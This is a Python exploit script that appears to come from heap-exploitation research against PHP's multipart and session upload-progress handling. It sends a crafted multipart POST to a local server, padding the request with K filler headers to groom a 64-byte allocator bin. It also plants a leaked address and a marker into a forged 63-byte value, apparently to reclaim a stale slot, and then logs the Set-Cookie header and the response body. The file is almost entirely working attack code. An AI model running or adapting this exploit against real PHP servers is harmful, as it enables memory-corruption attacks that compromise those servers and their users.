#!/usr/bin/env python3
"""B: K 39-byte headers in the forge part, then Content-Disposition, then a
63-byte forge value. K tunes when the 64B bin claims a new page; if it claims
page 0x6e, the forge raw takes slot2 = stale id.
usage: b_forge64_hdrK.py K LEAK [MARK]
"""
import socket,sys,struct
K=int(sys.argv[1]); LEAK=int(sys.argv[2],0); MARK=sys.argv[3] if len(sys.argv)>3 else 'M'
BND=b'B'*10
o=bytearray()
def part(headers,data):
    global o
    o+=b'--'+BND+b'\r\n'+headers+b'\r\n\r\n'+data+b'\r\n'
part(b'Content-Disposition: form-data; name="PHPSESSID"', b'attacksessionid0001')
part(b'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"', b'pwn')
v=bytearray(b'A'*63); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x18+len(MARK)]=MARK.encode()
h=b''
for i in range(K):
    h += b'X-%02d: '%i + b'q'*39 + b'\r\n'
h += b'Content-Disposition: form-data; name="forge"'
part(h, bytes(v))
o+=b'--'+BND+b'--\r\n'
req=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=20); s.settimeout(20)
data=b''
try:
    s.sendall(req+bytes(o))
    while len(data)<200000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:120].decode('latin1','replace'))
print('BODY',rest[:90].decode('latin1','replace'))
open('/tmp/b_forge64_hdrK.resp','wb').write(data)
